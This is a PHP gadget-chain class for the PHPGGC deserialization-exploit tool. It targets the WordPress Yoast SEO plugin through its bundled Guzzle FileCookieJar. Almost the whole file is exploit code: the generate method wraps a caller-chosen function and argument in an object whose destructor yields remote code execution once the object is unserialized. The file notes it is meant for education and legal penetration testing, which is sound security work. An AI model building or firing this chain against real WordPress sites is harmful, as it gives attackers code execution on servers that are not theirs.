<?php

namespace GadgetChain\WordPress\P\YoastSeo;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
  public static $version = 'Guzzle: 6.x, 7.x, -10.0 < YoastSEO < 28.5+';
  public static $vector = '__destruct';
  public static $author = 'mir-hossein (Mirhossein Rahmani)';
  public static $information = 'This GC has been provided to demonstrate PHP-TPTW trick. Please use this GC only for educational purposes or legal pentest.';

  public function generate(array $parameters)
  {
    $function = $parameters["function"];
    $parameter = $parameters["parameter"];
         
    return new \YoastSEO_Vendor\GuzzleHttp\Cookie\FileCookieJar($function, $parameter);
  }
}